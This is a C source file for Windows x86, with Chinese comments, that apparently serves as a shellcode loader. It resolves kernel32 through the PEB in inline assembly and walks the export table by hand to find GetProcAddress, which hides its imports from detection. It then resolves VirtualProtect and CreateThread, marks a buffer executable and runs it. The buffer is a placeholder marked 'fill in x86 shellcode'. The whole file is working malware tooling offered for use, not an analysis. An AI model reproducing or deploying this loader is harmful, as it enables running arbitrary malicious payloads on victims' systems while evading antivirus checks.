#include <stdio.h>
#include <windows.h>

//声明定义api函数
typedef FARPROC(WINAPI* p_GetProcAddress)(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
typedef HMODULE(WINAPI* p_LoadLibraryA)(__in LPCSTR lpLibFileName);
typedef BOOL(WINAPI* p_VirtualProtect)(LPVOID, DWORD, DWORD, PDWORD);
typedef HANDLE(WINAPI* p_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD(WINAPI* p_WaitForSingleObject)(HANDLE, DWORD);


// 内联汇编函数，用于获取Kernel32.dll模块的基地址
HMODULE inline __declspec(naked) GetKernel32Moudle()
{
    __asm
    {
        mov eax, fs: [0x30] ;
        mov eax, [eax + 0xc];
        mov eax, [eax + 0x14]
            mov eax, [eax];
        mov eax, [eax];
        mov eax, [eax + 0x10];
        ret;
    }
}

//获取GetProcAddress函数的地址
DWORD pGetProcAddress(HMODULE Kernel32Base) {
    char szGetProcAddr[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0 };
    DWORD result = NULL;

    // 遍历kernel32.dll的导出表，找到GetProcAddr函数地址
    PIMAGE_DOS_HEADER pDosHead = (PIMAGE_DOS_HEADER)Kernel32Base;
    PIMAGE_NT_HEADERS pNtHead = (PIMAGE_NT_HEADERS)((DWORD)Kernel32Base + pDosHead->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOptHead = (PIMAGE_OPTIONAL_HEADER)&pNtHead->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)Kernel32Base + pOptHead->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* pAddOfFun_Raw = (DWORD*)((DWORD)Kernel32Base + pExport->AddressOfFunctions);
    WORD* pAddOfOrd_Raw = (WORD*)((DWORD)Kernel32Base + pExport->AddressOfNameOrdinals);
    DWORD* pAddOfNames_Raw = (DWORD*)((DWORD)Kernel32Base + pExport->AddressOfNames);
    char* pFinded = NULL, * pSrc = szGetProcAddr;
    for (DWORD dwCnt = 0; dwCnt < pExport->NumberOfNames; dwCnt++)
    {
        pFinded = (char*)((DWORD)Kernel32Base + pAddOfNames_Raw[dwCnt]);
        while (*pFinded && *pFinded == *pSrc)
        {
            pFinded++; pSrc++;
        }
        if (*pFinded == *pSrc)
        {
            result = (DWORD)Kernel32Base + pAddOfFun_Raw[pAddOfOrd_Raw[dwCnt]];
            break;
        }
        pSrc = szGetProcAddr;
    }
    return result;
}


int main() {
    unsigned char buf[] = "填写x86的shellcode";

    HMODULE hKernal32 = GetKernel32Moudle(); // 获取Kernel32模块的地址
    p_GetProcAddress GetProcAddress = (p_GetProcAddress)pGetProcAddress(hKernal32); // 获取GetProcAddress函数的地址
    p_VirtualProtect VirtualProtect = (p_VirtualProtect)GetProcAddress(hKernal32, "VirtualProtect");  //获取VirtualProtect函数地址
    p_CreateThread CreateThread = (p_CreateThread)GetProcAddress(hKernal32, "CreateThread");  //获取CreateThread函数地址
    p_WaitForSingleObject WaitForSingleObject = (p_WaitForSingleObject)GetProcAddress(hKernal32, "WaitForSingleObject");  //获取WaitForSingleObject函数地址

    DWORD oldProtect;
    VirtualProtect((LPVOID)buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &oldProtect);

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(LPVOID)buf, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}